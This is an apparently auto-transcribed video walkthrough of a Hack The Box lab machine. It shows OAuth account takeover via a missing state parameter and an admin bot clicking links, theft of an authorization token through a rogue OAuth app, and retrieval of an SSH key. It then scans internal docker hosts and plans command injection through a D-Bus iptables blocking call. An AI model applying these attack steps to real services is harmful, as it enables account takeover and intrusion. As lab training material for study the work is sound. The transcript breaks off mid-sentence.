 what's going on youtube this is ipsec i'm doing ouch from hack the box which was marked as hard but i honestly could see this one being insane and that's saying a lot because most insanes have a bunch of like binary exploitation or like deep coding knowledge to be able to exploit it this doesn't really have any of that the heart of this box is at the foothold and that is exploiting oauth a like authentication technology that's used all across the web and in terms of oauth vulnerabilities this doesn't look like it's actually that complex i just didn't really know anything about oauth and i had to do a lot of research about it to figure out how to get a foothold if you're not familiar with it you've probably used it before like whenever a website asks you to use your google microsoft facebook whatever credential to log in that's oauth so you can always poke around those sites to see if they implement it inconsistently or insecurely and if you look at bug bounties related to oauth you'll find a lot of places implement it and securely so once you get past that whole oauth thing and get a foothold in the box then you come across having to exploit dbus which is a like back end system messaging thing where two applications can talk to each other another thing i just didn't have that much research knowledge into so i do a lot of research wasn't too tough to figure out how to get code execution through that so with all that being said let's just jump in this should be a fun box as always we're going to start off with the nmap so we're going to do sudo and map sc for default scripts sv enumerate versions oh a output all formats pin the nmap directory and call it ouch and then the ip address which is 10 10 10 177. can take some time to run so i've already ran it looking at the results we have quite a few ports open the very first one i noticed is ftp on port 21 and i see anonymous ftp login is allowed but i also see this banner is telling us it's vs ftpd version 208 or later which is interesting to me because just from experience i know version two of vsftpd is just ancient like i think we're on version three and three came out five years ago so i'm going to do a search point on vsftpd just to see if there's any known exploits and i don't see anything for two zero eight and we could try like the two threes but generally an exploit may die after this middle version so i'm not going to really worry about finding any like major exploits in the ftp but i do want to see what's on that server so i'm going to do make dirt ftp and that way just whenever i download something it'll go to the ftp folder and i'm going to do ftp 101010 177 and i'm going to log in with anonymous and i do notice the banner of this server has xtc's development server so we have a potential username so let's go over to cherry tree hit control n to create a new node we'll call it out and ctrl shift n to create a child node i'm going to say xtc is a potential username found in ftp banner but let's do a dir and i'm actually going to do dio dash a so if there's a hidden file we'd see it that's like dash all i think there is a single file project.text that was created february 11th so i'm just going to do a get against this and we can say fab 11 ftp file drop and if we ever go on the box i want to look around dates or create a word list for brute forcing passwords having the date is generally helpful so we downloaded project.text let's take a look at it and it has two things flask which is a consumer and django which is authorization server so probably two websites or two different web applications flask is a python micro framework and django is just like a big i want to say bloated but it's not really all that bloated just like a web framework so for instance like flask will give you everything to just launch a web page but django gives you everything to launch a web page and a whole user control section so it just gives you a lot more functionality within the framework the key thing i wanted to mention though is consumer and authorization these are two words that are very big and a protocol called o auth so um essentially oauth is whenever you go to a web page you can either log in directly to that website or you can log in with like your facebook google microsoft id that's oauth it's just a authentication protocol that lets third parties be able to do actions upon you without you giving those third parties your password essentially um something tells me we're going to go a lot more into oauth later so if that doesn't make sense hopefully it does by the end of this video but that's about it for ftp so let's go back over to the nmap we have ssh on port 22 tells us it's a debian box but really nothing too interesting there we do have two ports we have http on port 5000 and it's nginx its title says welcome to ouch and we also have port 8000 endops not telling us anything but based upon these headers like seeing http 1.0 i'm going to guess this is going to be a web server as well so the key thing we have to do now is figure out which of these is going to be flask which is the consumer and which one's going to be django which is the authorization server and as i'm saying that i'm looking at all these headers and we have authorization in one header so i'm guessing this django thing is going to be the or this port 8000 is going to be django but let's go take a look over at the web pages with the first one being on 10 10 10 177 port we'll do 5000 i'll go lowest to highest and i'm also going to turn burp suite off so let's just go to this page and we see welcome to ouch looking at the page source i don't really see anything too interesting other than there is a cross-site request for agree token but nothing really all that interesting so we could try logging in with like defaults admin admin uh internal server here that was weird admin admin okay we get a server error on that credential admin put something in the password and it fails so aaaa if username and password is the same we get an error it looks like nope unless i mistyped that let's do please sub please sub yeah so uh username and password this actually let's do notes but on the consumer and consumer is going to be flask port 5000 equals error that is definitely weird behavior and whenever i see weird behavior i throw it in burp suite to see if burpsuite will tell me anything else about this so click sign in send it over the repeater tab send it found redirecting follow uh go back i'm not exactly sure what's going on there but let's try registering an account because there was a link up here for register and we can create a username for the simplicity sake i'm going to create the username consumer and the password will be consumer at pleasesubscribe.com and the password will be password then we will register and let's do never save we can try logging in with consumer password and we get welcome to ouch so have a bunch of options we can do um all the data you enter here shared with the application is kept private so this whole message is kind of a hint towards oauth but let's not jump that gun yet and just see what this website has so going over to profile we have username consumer and connected accounts and one thing i always like doing is identifying if like authenticated endpoints are enumeratable without login and by that let's go over to burp suite turn intercept on refresh this page send it over to repeater and we're going to do ascend of course we get 200 okay with this page so let's remove our cookie click send we get a 302 found and then if we do profile does not exist we get a 404 not found so this is telling us that we can likely assume even if we're not authorized to hit a page it we can identify if a page exists and this is important when you do like go busters because if we just started go bustering this site right off the bat with um like go buster der mood dash u http 10 10 10 177 and then word list like user share word list um throwbuster directory list23 small.txt if we started doing this we had to specify the port which is 5000 um we can be confident that we're getting all the endpoints because it's behaving differently if it exists and we don't have authentication hopefully that makes sense so always know that type of behavior of a website and here we're getting various things like there is a documents but i think documents was actually on the list before i go back i'm turning intercept off so profile we see what a connected account is password change i'm going to test out this real quick password password one password one and the reason why i want to check this out is i want to make sure it has a cross site request forgery thing so i'm going to click change password and we do have this csrf token so what happens if i remove this if we get an error message that would be good if we don't then that'll be bad password change didn't really say anything so what i'm going to do is log out of the application and try logging in to tell if we changed a password so consumer password of password and we did not log in consumer password one we do so go back to notes csrf ignored on password change and let me double check yeah so that's definitely a bizarre functionality of it the next thing i want to do is if we can do a password change over a get request and the reason why i always go over this is just because like cross site request attacks if we can change a user's password that would be good for us so i'm changing it from password one to password2 proxy intercept on change i'm going to change request method and we're going to get rid of that click forward just gives us a blank page so let's go to log out log in password two and we can't log in so that password did not take effect um the other thing i'd probably want to check is if we actually need the old password sometimes you actually come when come to find you don't need that password at all so let's do change password and we can get rid of password one or the variable o password and i don't think it gave us an error message what if we click render unable to render response okay so let's just turn intercept off and log out and we'll log in so password two so we don't need the old password i did not actually expect that uh let's do password three password three intercept change so we can see we have this variable here but not putting anything in it click forward and this field is acquired so if we do password three password three click change password and just omit this o password altogether and then click send still says this field is acquired maybe that's just left over log out consumer and we're gonna do password three and i'm gonna unmask this field just so everyone knows that's actually what i typed so get rid of type is equal to password so you can see trying to log in with password three and it failed spectacularly password two i don't know exactly what just happened there let's do test password three password three intercept on change get rid of that forward that field is required so i just realized what mistake i did uh when i was going through the workflow i turned burp suite off of intercept and that's what happened so before when i changed the password to password two without that field um i forget what number my password is on now uh when i did this i had sent it to repeater removed the thing went back to the proxy tab turned intercept off and this is when the password changed before on the repeater tab this one failed but i didn't see it because it said unable to render response and i want to read that html and then i went back to proxy turned intercept off it sent the request and changed the password so this is a long about roundabout way of showing some weird workflow that i just messed up and thought i had a vulnerability when i didn't so this password changed it's it's probably fine so let's just try to figure out what a password is so i'm going to log out and we're going to log in with consumer and password three okay we have password three with consumer so i'm gonna ignore that password change that was a rabbit hole we didn't need to go down but clicking on documents we see documents is only for administrator accounts future we can access it about uh this is talking about the authorization server and just talking about things going over to contact we have a message we can send to the admin so i'm going to send like image source is equal to http 1010 14 2 please subscribe and we're going to stand up the netcat listener so nclvnp 80 sudo ncn lvnp80 click send and we get hacking attempt detected dear hacker did we not only tell you that this site is constructed following this highest security standards well we blocked your ipad just for about one minute and hope you learned something from that so we can try going well go buster has now started erroring we can shy pinging 10 10 10 177 cannon ping it so we are now blocked uh going over to notes uh let's do investigate how block works this is going to be where i kind of put things i want to go back and look at since i've kind of made a mess of these childs but let's just keep a pain going and i'm going to pause the video wait probably another 30 sec go looks like we're back so didn't realize i talked for a minute already let's go back here so it looks like we can go here i'm just going to put a link instead of doing like an actual attack putting html in this field i'm just going to see if he clicks me by putting a link so we send it http1010142 please click me click send and we just wait over on our netcat to see if anyone comes and probably about 30 seconds we get a click back and we know this is coming from the server because number one the connection is from 10 10 10 177 and we get the user agent python request and we haven't really touched python yet so we definitely can force the server to click us so go over here um can get admin to click links and slash contact we'll do consumer slash contact so we know that let's go over and check i guess the authorization server so if we do 10 10 10 177 slash 8 000 uh we just get bad request so let's go to burp suite turn intercept on go here see if we can figure out what is happening uh very authorization and request let's just get rid of the cookie we're sending still get that let's change to a post and we're still getting this so no idea what's going on here but everything we do to this port we're getting a 400 error and at this point we could make some guesses there's some hidden endpoints here or we could try different word list the downside is the default word list i generally use doesn't have the next word but knowing the scenario of the box you may just try it randomly and that word is slash oauth that is not in that dirt buster i don't think it's an er no it's not in any of them there's no auth but not oauth if you go into like opt set list probably discovery web content and grep for oauth and here grab r o auth you'll see we do have it in these word list so at some point you should always try other word list or just try things that make sense with all the hints towards oauth in the past i wanted to just try slash oauth and we have to tell burp suite to not intercept a request and we get the oauth endpoint and it says please note this functionality is currently under development and not ready for production use however since you know about this hidden url it seems you may be a developer already and are supposed to use it in order to connect your account you have to visit these urls and it gives us a domain consumer.ouch.htb i'm going to put this over in my host file so we can access it so sudo vi etsy hosts and we can do 10 10 10 177 and paste this and i'm also just going to put out.hdb as well i always like putting the like fully qualified or with subdomain and the parent domain as well it's just personal habit and now when we click this brings us to a sign in page so the username i think is consumer password of password three we get internal server error by refresh what's gonna happen looks like it is just hanging and again whenever i'm seeing behavior i don't like like a request hanging i send it over to burp suite and we dig down in the repeater so clicking go we have a 302 found and it's directing us to authorization.ouch.hdb on port 8000. so what i'm going to do is put authorization.out and i'm going to go ahead and close some of these because we have so many repeater tabs open now hit this page again uh we have to tell burp suite to not intercept and we only have like dns cached or something so it may take a few minutes for it to go through we can probably manually hit it with authorization.ouch.htb port 8000 uh what if i ping this did i type it correct i did go rip sweet let's no longer use you there we go it may be cached inside of burp so i just have to wait for that cache to die but we get the out simple and secure authorization server and remember when we hit this with just our ip address it always directed us to like a 400 bad request so we can log in or register a new account for registration we're asking you for ssh credentials to your out orchestration server this is only required if you want to use the out orchestration application since this one is currently under development you'll most likely want to ignore ssh related fields inside the registration form so let's go register this is going to be authorization and optional optional email is required so authorization at please subscribe dot com ssh will ignore like it says to and the password we'll just do password click login and password is too common okay so i'll do the password of please sub and password is too similar to the email address well this is django so remember what i said probably earlier in the video that django handles all the user stuff for you well this is why django is defaulted to how it builds user accounts and has a bunch of like password complexity checking built in so that wasn't left up did the developer when the developer had his choice in flask he just chose not to put the code in to make account sign up secure and that's why we could use a bad password but because we're in django and django's taking control over a lot more functionality it's just by default says thou shall not use weak passwords so i'll do um auth pass a-u-t-h p-a-s-s let's see if that one works it does so in this notes i'm gonna do creds and we're gonna do consumer password three authorization off pass to kind of keep track of this because now we are no longer in sync so authorization auth pass and we can log in and the relevant endpoints are slash authorize and slash token so clicking on slash authorize we get invalid request missing client id parameter and if we go to token we just get a blank page and again whenever i get something i don't know i send over to prep suite and take a look so going into the repeater rip suite still doesn't know what authorization.ouch.htb is what the hell come on 10 10 10 177. and this should work because how the server knows what the host name was is this host header but we get method not allowed so if i change the request method to a post we get bad request and we get the error message unsupported grant type and again there's a lot more of oauth stuff so grant type equals test unsupported um by google let's do what is it oauth grant type i want to say it's something with like authorization or something grant type equals authorization code so there's going to be a few grant types we can use but we want probably authorization code invalid request missing the code parameter and code equals please work and now we get invalid client and at this point the client this is going to be like a username password type thing but it's going to be meant for applications which is like client id and client secret and we don't have an application or anything we don't know these parameters so we're just going to drop it for now um go back we can now go over to the consumer and that was probably confusing because my browser pointed me to a url that you didn't get to see the workflow so let's just go to port 5000 get a profile uh documents oh go to slash oauth if you go to oauth connect now that we have a um client let's do burp suite connect here let's see let's do send and now it's directing us to connect giving the session and now we're sending a client id and this is going to authorization so this piece may fail because we're going through verb suite and i don't think pro suite knows what this domain is but let's see so this is going to be a client id we don't know what this client id is so i'm just gonna put question marks so click forward and authorize ouch consumer and application is requesting the following permissions reading scope so if we click do we still have burp suite we do so it looks like burp suite dns has refreshed but at this point we're sending a post request and there's something weird going on here that makes it hard to spot the flaw is we're sending parameters this is a post we're putting things in the get and we're also putting things in the post so client id is here and client id is here begins with ud ends with eight two uda2 um there are fields in this post that are not in the client and if you didn't look at all the fields in the post you'll probably miss the vulnerability and the vulnerability here is the state being empty so when the state is empty it allows us to use a token for something it's not so let's kind of go through um something here let's see let's go to this turn burp suite off um try oauth facebook application workflow see do we have a good image here scrolling around let's just tell google to give us images so this looks good so i recommend reading this page i'll do my best to summarize what we are doing so this is an example using facebook and the example here is letting a facebook application read some of your data so it can suggest you friends and in order for the travel buddy app to know who you're friends with it has to be able to read data off your profile there's two ways it can do this either you give travel buddy app your username and password and that just logs in as you and it can do that but i mean anyone even non-security people know that's a bad idea so what oauth does is it provides a way for you to give some type of access to a third party without giving them access to your password so with the user we decide hey we want to install the travel buddy app we go there and the travel buddy's like yeah um i'm totally fine suggesting you some friends just please go to this location and give me authorization so it redirects us to the authorization server the oauth server for authentication and that is this thing right here so we're at this piece right now when we're doing this and when we click the authorize button it's going to add travel buddies token to facebook server to allow us access or something along that line so that is kind of the workflow i'd highly recommend reading a bunch about oauth and uh is it like an oauth for pen testers book remember there was one that i really liked um maybe just read everything on owath for pen testers i forget who published the book uh this would probably be a good one let's see what does this cover look like yeah maybe it will author account takeovers i definitely read all of this and when i mention the state parameter this is going to be what ties the next piece to your account so let's see let's just go back over here we clicked authorize we have this request has all this data we're going to click forward and we get directed back to this profile that says authorization has access so let's go log out of our account and we'll do slash probably oauth slash login i think authorize internal server error profile here's something weird log out let's do oauth login and intercept the request send okay do oauth login client id code redirect url i honestly don't know exactly why this is working oh because we're on authorization.ouch.htb and we go over to storage we can see here we are uh session id so we're logged into authorization.ouch.htb we have no cookies to consumer so if we look at storage here no cookies here but going to authorization and we're logged in as the authorization user account we click authorize and now when we get redirected to ouch a recession is valid and that is because the connected account was authorization so we used this account to log in as consumer so what would happen if we tricked a user to give us access to their account so let's go back over to slash oauth we're going to follow this workflow again so proxy intercept intercept uh let's not do repeater actually so we're sending it to oauth connect go here when we click authorize we're making a post to the authorization ouch.htb and then we make this request which is adding the token to be authorized to us and because there's no state um if any account hits this url it's going to give us access to that if there was a state that state would be like a session id that would be tied to my username so only my account is able to hit this token but because there's no state this token has no user tied to it so if any user uses this token it will be granted access so hopefully that makes sense so what i'm going to do is go to a new tab turn burp off because i don't want to just click intercept off and then this token gets used and then it gets invalid so that's why i did it that way i'm going to go to contact and the message is going to be http um this is going to consumer.ouch.htb consumer ouch dot htb and i think there's two o's put 5000 and then that url that is looking correct so we're going to do something before we send this and do sudo lv and i'm gonna do kp80 uh oh pseudo nc lvmkp and what that did was if i do curl localhost it's not going to kill my netcat so it shows multiple things so if i get multiple connections it's fine so the reason why i did that because right after i make this request i'm going to make a second request to 10 10 14 2 please click me and that way i'll know when the first link was clicked because i'm guessing every link that gets sent to him he clicks so when i see my netcat change i should see something on this page change so we're just going to wait for the eventual netcat change so we got it now we have the please click me there's nothing valuable in here but if we refresh this page we see no accounts connected so the authorization account that we had created went away so what i'm going to do is going to do log out we're going to do the oauth login and this is going to get to again use our authorization account to log into this website and whoever is tied to our authorization account will be granted access so when we click login we go to profile and now we are the user xtc and again that's just because when he went to that url he granted us access and that happened because there was no state and additionally there's no cross site request forgery on that little button click so as this user let's perk around to see what we can do um password change well we know we can't really do anything here because we don't know his old password and that funny fail from a few minutes ago or probably 30 minutes ago i don't know how long i've been talking but it shows we can't really do anything on this forum so i'm gonna ignore it going over to documents we do have some cool information we have dev access and it allows application registration uh we got this api get user thing and chris mentioned all users could obtain my ssh key must be joking going to about same thing going to contact same thing so the only thing that changed was this documents thing and we got credentials so the very first thing i want to do is i'm just going to test these credentials against ftp to see if there's something different if we give it a valid user so ftp 101010 177 develop that super secure something oh server is anonymous only wasn't even asking for a pass when i put it in uh opsec fail for me but nothing there um it allows application registration and then we also get this api get user so this is more straightforward so i'm going to try to hit this on various things uh we can turn intercept off refresh that real quick but i'm going to go over to this page api get user not found so i'm going to change that to authorization.ouch.htb port 8000 we get a blank page i guess we're going to look at burp so do this turn intercept on refresh send it over to repeater we get a forbidden change request method forbidden so we don't have permission probably to hit this endpoint um hit random things we get not found so at this point we know we could go buster this api thing for various things but yeah get users so get user and get users are both commands i think uh maybe just anything get user test forbidden so looks like git user accepts anything after it bit weird but again just play with things note all the oddities maybe that oddity will be exploitable um let's see what were we doing uh we have to figure out this application registration so at this point you could again play around with a lot of go bustering and like if we do oauth application let's turn burp sweet off our applications we get a login so we find valid applications here um if we try logging in with these credentials i gotta go back here develop and this password it's not going to work but at this point you can again brute force a bunch of things and figure it out that way however if you're a developer or you read the docs this may be easier out whenever you find yourself attacking a web framework like django um read the docs of django and you'll have to do a lot less brute forcing because you just understand how it works under the hood so if we go to latest this isn't the page django um oauth here we go django oauth toolkit so let's see if you read this i think application views you'll see the url applications register so let's go back to this oauth and do applications register and we have to copy that password again uh develop password and we can register a new application so easiest way to find this is just again reading the documentation and the side effect of reading the documentation you'll know what fields things accept so you'll be able to play with them a bit more the new app we'll call this uh please subscribe i guess name doesn't matter but let's put client id and client secret in cherry tree uh notes consumer authorization i still don't know what that client id is there but please subscribe application this is client id and this is going to be the client secret i'm just going to copy this again because i hit a key and i wasn't sure if the key actually pressed all the way down doesn't look like it did so let's see the client type confidential or public because i want to use this like have users click things and use this i'm going to do public i don't think the client type matters but again if you want to know exactly what that field is if you just google oauth client type um it'll say if the client type is confidential the client authorization server establish a client authentication method suitable security so public less secure and when we're attacking things i always choose less secure that's my take on it but we have grant type authorization code implicit resource earner i'm going to do authorization code again read the docs if you want to understand how this works and redirect url well i'm going to redirect them to my server generally like with the travel buddy example and do we still have that open we don't uh right here when you hit the redirect url it redirects you back to the application so right here authorizing we authorized it and once it authenticates the server goes okay well you're authenticated to the travel buddy app we assume you want to go back to the travel buddy app here you go so that's what we're going to do here so the redirect url is going to be http 1010142 which is my ip address and we can put anything we want here because the previous example i think used token we're going to use token as well but do this click save so now we have an application with a client id and client secret and a long time ago when we were playing with something i think was on the authorization server with this authorize we're missing like the client id parameter so now we have a client id client secret and all that good stuff but we can go to whenever i get an error i hit ctrl shift r and it seems to fix it i'm guessing that may be like a cross site request forgery thing or something i don't know exactly but let's go back to oauth and what we want to do is we want to get a token for a user so let's go intercept on go to this connect didn't intercept as much as i wanted to cancel home o off control shift r intercept on click here and look at these through burp suite nothing interesting looking at this client id don't think we need that ford what happens when we click authorize see we get this this is what i want to play with so we can put a client id here and i think a client secret so copy it go over to the repeater tab and let's see can we do this with a get request let's delete this i don't know what i just did what's my clipboard redirect url okay change request type and we want to put our client id this is going to be for our application so go over here to our burp suite notes grab our client id paste it click go and we get a bad request and the error is mismatching redirect url and if we look at the redirect url that is right here ctrl shift u um essentially what the application did was it took her client id looked up in the database and saw the redirect url is not consumer ouch htb it is the 10 10 14 2 and what it's doing is redirecting us to the original page with the token saying we are authorized or whatever so let us and this i think is like a time based or one one-time token thing because it changes every time but the key piece we can do is force someone to go to this page and when they do they give us their token so copy this we go back over into uh consumer and before i do that i'm going to go to authorization i'm going to paste the url and we should look at burp suite send it and see what happens we get a request from ourselves with a token so we know that url is good so when we go to the contact page and give the admin this url we should get something good in return so we sent it to them and i'm going to wait probably about a minute and see if we get a hit it's been some time and i haven't got a hit so i'm going to check back at this url we're going to copy it out i'm going to paste it over in the cherry tree just so i have it oh god no what does this redo i could have swore i hit a key and added something to the client secret i wonder if we can regrab that do i have it i do not oh i do grab this and paste yep i did add a three but grab this again go over paste the url and we get a hit so looking at this there's one thing that's not there http so let's try adding that uh i don't know i keep control seeing out of that probably so my browser doesn't hang but where is the contact let's just go back to consumer refresh page a few times come on server work there we go come on paste send send i think it was sent close these tabs and we get a hit so right now we have both a session id and request if we do the session id in the browser we can probably access this page as qtc but i mean we already are so we don't have to worry about that but the main thing is is this token so with this token we can finish off the authentication flow and get access so let's copy this and go back to a web browser and we're going to do authorization ouch.hdb and we're going to use this token endpoint i'm going to send this over to burp and we'll refresh go over in repeater and if we send this this is where we got the method not allowed we changed the request method to a post and it wants a grant type so grant type let's see forget what we did um probably like authorization or something grant type oauth so let's do authorization code go missing the code parameter code is equal to the token now it's missing the client so we'll do client underscore id and we're going to use the id of our application so we paste this did that paste correctly looks like it did and i thought we would need the secret guess not so we get this access token it's a bearer token and the refresh token and valid grant so i guess that token was only good once let's redo that uh let's see http sure so what i was saying before burp suite rudely interrupted me was the refresh token that is like a master token so what i mean by master token is when we use this one client id here's the code we use this token we get access to this and this token is only good for 10 minutes however the refresh token is able to refresh and get a new token so think of it like this when you go to login to like office 365 or you email there's the box to like remember me i think and i think that gives you access to the refresh token so when you go to the page you can go use the refresh token get a new token to access your email otherwise the token disappears and kind of the reason for that is if this token gets stolen then it disappears pretty quickly so refresh tokens are definitely something you want to keep in your back pocket if you ever see let's just go and use this so it's a bearer and if you look in like http you know this token is done by like the authorization error header so let's go um back and we can do was it curl authorization.ouch.htb api get underscore users uh port 5 uh 9 000 or 8 000. so dash v we're getting this authorization failure so i do dash capital h to put a host header in we're going to do authorization bearer and then we're going to take this token and we only have this token for 10 minutes so if it starts dying we have to go redo the step to get this token because i don't know how to do the refresh token off top of my head so we do this and we get a page back there is a lot of like um oh only if i do the dash v there's that stuff i get rid of the dash v just returns the uh json object so i'm going to pipe that over to jq and we get this um download thing so i'm going to add the dash s for silent and it's going to get rid of that so now we can do get users um if we do like it uses a bunch of junk still hits that endpoint so it's just checking for anything with get underscore user if that's in it then it's going to go to it we could use something like wfuzz and fuzz a bunch of functionality one of the notes said there was a get there was an ssh thing so we do get ssh and we can get a key so we can do jq dot ssh underscore key and it's only going to display this the one downside is we have it displaying the line breaks if you do a dash r for raw it will actually print the raw output so we can do this x t c dot key and what i was saying before with w fuzz so if we do jq dot let's see if we can do this quick actually i'm going to do sudo apt install is it fuff ffuf there we go i think this is a fuzzer that's like w fuzz but in go um so we'll finally give this tool some love this is it yeah fast web fuzz written go so i've never actually used this one before so i think it's just like w fuzz dash w word list u so we're going to do dash u http authorization dot um ouch is it hdb yeah port 8000 slash api and we can say get underscore fuzz dash w for word list user share word list unless you um [Music] user share or is it user set list oh my god user share i actually used this word before earlier in the video locate set list grab usr let's just do opsec list maybe i did it in opt before i don't know but upset list uh fuzzing and let's see what do we have i was looking for like variables or something but we don't really have too much up set list discovery variable secret keywords and then let's do f again dash h i always think it's two s at the end two from the beginning we want to look at header so dash capital h so go back to this request h authorization bearer grab the key and let's see user name is size 87 everything else is 2708 so maybe there's like dash dash h s 2708 how do we hide uh filter response line dash fs so filters probably hide and m is match maybe so let's do fs and then a number so fs2708 and we only get username if we added ssh to this keyword is ssh here i wonder why it's stopping so it's stopping after a certain number of words but ssh we did find get fuzz yeah i'm not sure exactly what's going on so let's go back to w fuzz like that get a bunch of 404s so we can do dash dash hc for hide code 404 and we can get a bunch of hidden functionality uh username ssh key and whatnot so definitely have to take a look at ffuf some more i hear it's a great program i just don't know the arguments so sometimes we know a tool you just always default to it but we have that ssh when we hit that endpoint we get the key so chmod 600 qtc dot key sh i qtc.key uh qtc at 10 10 10 177 and we get into the server so we have finally after some time got shell on the box the first thing i want to do on the box is just list the files in the current directory which is qtc's home so do a find dot dash type f to only show me files because i really hate my accidentally cat a directory not realizing it's a directory and then dash ls is just going to show me file permissions in like creation time so the first thing we have is user.txt created today and then we have an ssh key or a private key and authorized keys file and these have the same exact time stamp so i'm guessing this private key goes to what a public key is in here and then we also have dot note dot text oddly enough created at the same exact time and we have this dot profile and that bash rc created like 20 seconds prior to this so i'm guessing this is when the box spun up and created the account and then we had 20 seconds later something happened to create all three of these files it's weird to see the ssh key and note created at the same time but i'm just going to take a look at the note and maybe that'll explain it we have the note saying implementing an ips using dbus and ip tables genius so this is probably intrusion protection system and this is referencing when that like cross-site scripting or whatever attack we did in the contact message a long time ago caused us to get banned that's probably how it worked it used dbus which is like a messaging bus designed so two different applications can talk to each other so based upon this note i'm guessing the web application talks to ip tables through dbus let's go and just do a fine slash etsy grep dash id bus to see if we see anything that stands out and i'm going to do 2-dev null just to hide any error messages and also i want to do a dash type f to hide this directory before i can it if that is even a directory or this directory so let's see oh wait what okay so the error message was shown because i did two dev null on this side of the pipe i need to do it on this side two is the like file descriptor for standard error so file descriptor direct to devnet let's see we have hcb.ouch.block.com under etsy dbus1 this so this doesn't look standard so if we cap this file we can see some xml and let's see policy root owns this dub dub dub data can do a send destination and receive on this we are xtc we are not dub dub dub data so we probably can't talk to this bus even if we knew where it was so let's go and do a cat etsy passwd and www data isn't even here ftp is but data is not so i'm going to do a ls-la on slash and we see let's see anything interesting nothing too interesting there except a bunch of sim links if we do an ip address we can see a bunch of interfaces and the main one that's sticking out right now is docker so we know we're probably in some type of docker container i was doing it ls dash ls i was doing a ls dash la slash first because i'm used to seeing like docker m and docker containers but i don't see that here um if we go back just in home we just have qtc we did have the ftp user so i'm just going to do an ls on ftp and see if we can find project.text to see if this is the container we are in uh to dev and yes we can opt ftp root project.text so we're probably in the ftp container for this and there's probably a dub dub dub or a web container so let's go and enumerate what containers there are so if we do ip address and we want to look for anything that has an ip so we can try looking at 172 17 and 172 18. so what i'm going to do let's just do this in um hm v icmp scan dot sh 4i and let's just do like the first 10 110 do and we'll do what is it ping dash c1 for count one 172 i forget what the ip was already uh 172 17 0. 172 17 0 i and then we can say done if we just run this scan we see it's going to ping each ip um there's a bit better way to get better output and we can say if that command is successful with a and and then echo host alive and we need to 172 17 0 that so now we can see the host to live message but wait we can even hide this ping message so ctrl c a bunch of times go here and on this ping do to or just pipe it to dev null so there's no output on that and we get host alive now it's still taking a while because we have a bunch of just dead hosts so i'm going to hit ctrl c a bunch again and what we're going to do is do an or an echo host dead 172 17 0 i okay and then for this ping command i'm going to do a timeout which i think is cat dash capital w i remember that as weight one dash t is ttl for time to live which is how many hops the ping packet can take before it times out it's not how long it lasts or the duration at last i guess is the better way to say that so wait one second and we can see her script working but we're not enumering anything and the reason why i'm just going sequentially because i know docker from experience assigns ip sequentially so let's try looking at this 172 18 address so we can do 172 18 and change it here and change it here if we want to take this a bit better we could like do host equals and then do the ip and use the host variable down there but i'm lazy and did not do that so running this we get immediate host of lives one through five uh we are one so of course we're alive but we got a few others so at this point we can scan those try to interact with them we could do like curl 172 18 0 2 3 4 5. i'm guessing maybe one's the flask application and one is the django so doing four on port 5000 gets us uh maybe that's the that's a flask server five this one's probably the authorization at 8 000. nope let's do four and eight thousand three two so two is the authorization server i don't know what four and five are but we can copy our icmp scan.sh to do portscan.sh and we're going to change this command around a little bit i'm going to say echo please subscribe to dev tcp 172 18 0 dot i 22 and then we'll have ssh alive 172 18 0 i echo ssh dead 172 18 0 hi so very similar to what we did with the ping and we no longer have to go to 10 because we know it stops at five and we know one is herself but i was going to remove it i'm going to leave it there because this tells us if our script is working so now we can do bash port scan and we're not getting anything so maybe our script is not working let's do ben bash echo please subscribe once oh 172 18. there we go so we got a command not found i did not do echo here i hate when something screwed up with like my input and vim does weird things so we're getting standard error let's hide that so we can do echo please subscribe we can do to dev null to hide error messages and there we go so we have ssh alive on 172 1804 and that is where we believe the flask application was working i believe for 5000 yeah that's where we believe the flask application is but since ssh is there let's just try ssh 172 1804 and it's automatically going to try the qtc user with his private key because that's how ssh is configured um yes except the key and we can get into this container so lsla slash and we have the docker m directory here so we know we're definitely in docker there is a code directory so before we go into code let's just look in what's our home directory find dot hey all right dash type f dash ls nothing really here so let's go into opt code all right just slash code and we have uws gi which is like a web server gateway.ini if we look at that we can just see how it's configured there's the socket for uw-sgi and it's just a gateway interface so what this is doing is we have python going to this file socket and then engine x is running somewhere directing it to this is engine x on this it is so we can just go to etsy engine x uh probably grep dash r u w s g i dot socket to find what file it's in nginx.com we don't have less that's annoying so we can see http server 5000 here's the name here's the route any request on slash uw-sgi forward it to this socket so nginx is better at handling like load balancing and things like that so that's the web server and it passes it to this python program it's just a more optimal way to do this and also you could have like nginx do caching things so you can have caching in front of your python application which if you whenever you hit the python code you're going slower than nginx essentially so you can google around for benefits of like wsgi and things like that so let's go back into the code and the thing we wanted was to look at how the code blocks us because when we sent it the like cross-site scripting request we got blocked the note just from a few minutes ago says that happens over d bus so i'm going to do grep dash r to go recursively i blocked on everything and we can see the uh code is in templates hacker.html saying it's blocked i want to just look at what calls hacker.html because if we look at this this is just a template file probably like uh jinja2 templating or something if we cap this uh we can see yeah so the python code calls this whatever's between the percent bracket gets executed kind of with a templating engine so this means grab base.html put it there grabbing header from python code etc so let's look at what calls hacker.html so grep r hacker period and we can do null to hide the error message but we see routes dot pi so let's do cat ouch routes dot pi and then search for hacker and right now we have some code bus is equal to d bus dot system bus bus get object hdb dot ouch dot block here uh interface so this is it send uh communicating so let's see going here i'm just going to do control shift n d bus paste that's a bunch of python code we'll want um i wonder if i can just highlight shift tab there we go so this is just initializing dbus then this is going to create the block object which is going to be the location essentially and now we're creating the interface and then client ip we're getting remote address this is a server variable coming from nginx and then we're sending the block device the client ip and then this gets put into ip tables so on the other end we can probably assume there's like an ip tables whatever block is so dash block which isn't the syntax but for explanation we can and then client ip so we control client ip so if we put client ip to like semicolon rev shell semicolon or comment then anything that comes after iptables like uh interface eth0 or something would get ignored because we commented it out but in this command we would execute a rev shell so that's the idea of what we want to do the issue we have right now is we are still xtc we are not um www data so we probably don't have permission to access this block device uh we can try so let's go back here let's do python import dbus no module found find slash user grep dash i d bus let's see we have the dbus package let's see i'm just going to go into this directory i do python here import dbus and imports so for some reason the python path doesn't have this user lib python 3 disk packages in it so it's not importing this package it's probably like installed through virtual and for maybe www data has this environment this just doesn't so when we try to import it it didn't however one of the inputs is your current working directory so if we just go in there it's a hacky way to just add this to your path maybe when we do dub dub dub data we'll look up the syntax to programmatically do this to kind of explain it further but let's run this code so let's do this uh we don't actually need client ip so client ip yeah we'll do run me is equal to ping dash c 1 10 10 14 2 and then we'll comment it out and i'm going to do single quotes like that so run me is that so we can change this to run me tcp dump dash i ton zero icmp pseudo and we can grab that and we get an access denied so we don't have a mission we have to somehow get access to be dub dub dub data so let's do uw sgi exploit code execution do we have anything here what comes up this comes up and this i've seen this repository before a lot of stuff is in chinese like if we read this don't know exactly what this is but um it was published january 1st in 2018 and if we look at uw sgi version uh it's this date and if we 